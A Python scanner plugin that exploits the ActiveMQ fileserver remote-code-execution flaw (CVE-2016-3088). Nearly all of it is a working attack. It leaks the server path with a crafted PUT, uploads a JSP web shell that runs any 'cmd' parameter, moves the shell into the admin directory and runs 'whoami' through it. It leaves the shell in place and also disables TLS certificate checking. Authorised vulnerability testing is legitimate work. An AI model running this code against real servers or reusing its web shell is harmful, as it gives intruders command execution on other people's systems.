# -*- coding:utf-8 -*-

import socket
import time
import urllib.request, urllib.error, urllib.parse
import random
import re
import http.client
import ssl

ssl._create_default_https_context = ssl._create_unverified_context

def random_str(len):
    str1 = ""
    for i in range(len):
        str1 += (random.choice("ABCDEFGH1234567890"))
    return str1

def verify(protocol,ip,port):
    url = protocol+'://'+ip+':'+str(port)
    print('testing if activemq remote code exec (cve-2016-3088) vul')
    try:
        newurl =ip+':'+str(port)
        socket.setdefaulttimeout(8)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, int(port)))
        execvalue = random_str(6)
        filename = random_str(3)
        flag1 = b"PUT /fileserver/a../../%08/..%08/.%08/%08 HTTP/1.0\r\nContent-Length: 9\r\n\r\nxxscan0\r\n\r\n"
        s.send(flag1)
        time.sleep(2)
        putresult1 = s.recv(1024)
        s.close()
        if (b'HTTP/1.1 500' in putresult1) and (b'Server: Jetty' in putresult1) :
            putresult1 = putresult1.decode()
            match1 = re.search('500(.*)fileserver',putresult1)
            absolute_pathname = match1.group(1)
            absolute_pathname = str(absolute_pathname)
        else:
            msg = 'There is no activemq put method on this server'
            number = 'v0'
            return False,url,number,msg
        conn = http.client.HTTPConnection(newurl)
        conn.request(method='PUT', url='/fileserver/'+filename+'.jsp', body='<%@ page import="java.io.*"%>\r\n<%\r\nout.print("'+execvalue+'</br>");\r\nString strcmd = request.getParameter("cmd");\r\nString line = null;\r\nProcess p=Runtime.getRuntime().exec(strcmd);\r\nBufferedReader br=new BufferedReader(new InputStreamReader(p.getInputStream()));\r\nwhile((line = br.readLine()) != null){\r\nout.print(line + "</br>");\r\n}\r\n%>\r\n\r\n' )
        response = conn.getresponse()
        conn.close()
        if (response.status == 204) and ('No Content' in response.reason):
            conn = http.client.HTTPConnection(newurl)
            conn.request(method='MOVE', url='/fileserver/'+filename+'.jsp', headers={'Destination': 'file://'+absolute_pathname+'admin/'+filename+'.jsp'})
            response = conn.getresponse()
            conn.close()
            if (response.status == 204) and ('No Content' in response.reason):
                testurl = 'http://' + ip + ":" + str(port) + '/admin/'+filename+'.jsp?cmd=whoami'
                res_html = urllib.request.urlopen(testurl, timeout=10).read()
                execvalue = execvalue.encode(encoding='utf-8')
                if (execvalue in res_html) and (b'strcmd' not in res_html):
                    msg = 'There is activemq remote code exec (cve-2016-3088) vul on url: ' +url+ ' with shell address: '+testurl+' .'
                    print(msg)
                    number = 'v75'
                    return True,url,number,msg
                else:
                    pass
            else:
                pass
        else:
            pass
    except Exception as e:
        msg = str(e)
        number = 'v0'
        return False,url,number,msg
    msg = 'There is no activemq remote code exec (cve-2016-3088) vul'
    number = 'v0'
    return False,url,number,msg







